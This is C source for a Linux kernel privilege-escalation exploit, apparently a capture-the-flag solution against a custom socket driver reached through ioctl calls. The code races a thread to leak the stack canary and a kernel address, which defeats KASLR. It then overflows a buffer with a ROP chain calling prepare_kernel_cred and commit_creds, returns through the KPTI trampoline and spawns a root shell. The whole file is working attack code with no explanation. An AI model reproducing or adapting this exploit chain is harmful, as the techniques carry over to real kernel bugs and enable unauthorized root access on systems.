#include <stdio.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>
#include <pthread.h>
#include <stdbool.h>
#include <stdint.h>

int sock;

/* Guessed struct */
typedef struct {
    long opt;
    size_t n;
    char *buf;
} magic_t;

/* Backup registers */
unsigned long bak_cs,bak_rflags,bak_ss,bak_rsp,bak_rip;
void bak(){
    __asm__(
    ".intel_syntax noprefix;"
        "mov bak_cs, cs;"
        "mov bak_ss, ss;"
        "mov bak_rsp, rsp;"
        "pushf;"
        "pop bak_rflags;"
        ".att_syntax;"
    );
    puts("[+]Registers backed up");
}

/* Helper functions */
void debug(){
    puts("paused execution");
    getchar();
}

void open_sock(){
    sock = socket(15,SOCK_DGRAM,0);
    puts("[+]Created socket");
}

void magic_bof(size_t n, char *buf){
    magic_t magic = {
        .opt = 0x1338,
        .n = n,
        .buf = buf
    };
    ioctl(sock,0x13371002,&magic);
}

size_t magic_overread(size_t n, char *buf){
    magic_t magic = {
        .opt = 0x1337,
        .n = n,
        .buf = buf
    };
    return ioctl(sock,0x13371002,&magic);
}

void *racer(){
    /* Control dev_info->size */
    while (1){
        ioctl(sock,0x13371001,0x150);
    }
}

size_t magic_devinfo(){
    return syscall(54,sock,NULL,0xdeadbeef,0xdead000,NULL);
}

void bin_sh(){
    close(sock);
    printf("[+]UID: %d\n",getuid());
    system("/bin/sh");
}
unsigned long bak_rip = (unsigned long)bin_sh;

void* gen_payload(unsigned long canary, unsigned long kaslr){
    char *payload = malloc(0x200);

    unsigned long *rop = (unsigned long)payload+0x100;

    *rop++ = canary; // canary
	*rop++ = 0;
	*rop++ = 0xffffffff8108cbc0 + kaslr; // pop rdi
	*rop++ = 0;
	*rop++ = 0xffffffff810cac80 + kaslr; // prepare_kernel_cred
	*rop++ = 0xffffffff81125f92 + kaslr; // pop rdx
	*rop++ = -1;
	*rop++ = 0xffffffff8103455d + kaslr; // cmp rdx,-1
    *rop++ = 0;
    *rop++ = 0;
	*rop++ = 0xffffffff81278f23 + kaslr; // mov rdi,rax
    *rop++ = 0;
    *rop++ = 0;
	*rop++ = 0xffffffff810ca910 + kaslr; // commit_creds
	*rop++ = 0xffffffff81c00a34 + 22 + kaslr; // kpti trampoline
	*rop++ = 0;
	*rop++ = 0;
	*rop++ = bak_rip;
	*rop++ = bak_cs;
	*rop++ = bak_rflags;
	*rop++ = bak_rsp;
	*rop++ = bak_ss;

    return payload;
}

/* Exploit */
int main(){
    pthread_t rcr;

    bak();
    char* overflow = mmap((void*)0xdead000, 1000, PROT_READ|PROT_WRITE|PROT_EXEC,
                MAP_ANON|MAP_FIXED|MAP_PRIVATE, -1, 0);
    memset(overflow,0x41,1000);

    open_sock();
    magic_devinfo();

    char *brute = calloc(1, 256);
    unsigned long *leak = calloc(1, 0x150);

    /* Bruteforce dev_info and do race condition to trigger overread */
    bool bruted = false;
    size_t ret;
    pthread_create(&rcr, NULL, racer, NULL);
    puts("[+]Leaking canary");

    for (size_t i = 0x101; i <= 0x150; i++){
        for (int j = 0; j < 0x100; j++){
            overflow[i-1] = (char)j;

            do{
                ret = magic_devinfo(); // writes into dev_info
            } while(!ret);


            if(!bruted){
                for(size_t i1 = 1; i1 <= 0x100; i1++){
                    for(int j1 = 0; j1 < 0x100; j1++){
                            brute[i1-1] = (char)j1;
                            if (magic_overread(i1, brute)){
                                break;
                            }
                    }
                }
                bruted = true;
            }


            if (magic_overread(i, brute)){
                ((char*)leak)[i-1] = j;
                break;
            }
        }
    }
    pthread_cancel(rcr);


    unsigned long canary = leak[32];
    unsigned long kaslr = leak[34] - 0xffffffff81902b1d;

    void* payload = gen_payload(canary, kaslr);

    /* Trigger buffer overflow */
    printf("[+]Buffer overflow\n");
    magic_bof(0x200, payload);

    return 0;
}